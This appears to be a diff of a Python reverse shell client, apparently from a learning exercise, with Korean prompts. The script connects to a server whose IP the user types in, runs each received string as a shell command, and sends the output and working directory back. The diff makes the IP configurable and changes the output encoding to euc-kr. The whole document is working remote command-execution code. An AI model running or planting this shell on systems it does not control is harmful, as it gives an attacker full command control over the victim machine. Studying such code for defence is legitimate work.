@@ -17,10 +17,14 @@ import os
 import socket
 import subprocess
 
+print('클라이언트 프로그램 구동 시작')
+host_input = input('접속 서버의 아이피를 입력하세요(ex. 192.168.0.7) : ')
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '192.168.0.7'
+#host = '192.168.0.5'
+host = str(host_input)
 port = 9999
 s.connect((host, port))
+
 
 while True:
     data = s.recv(2048)
@@ -29,9 +33,11 @@ while True:
     if len(data) > 0:
         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_bytes, "utf-8")
+        output_str = str(output_bytes, "euc-kr")
         s.send(str.encode(output_str + str(os.getcwd()) + '> '))
         print(output_str)
+
+
 
 # 연결 종료(Closing connection)
 s.close()
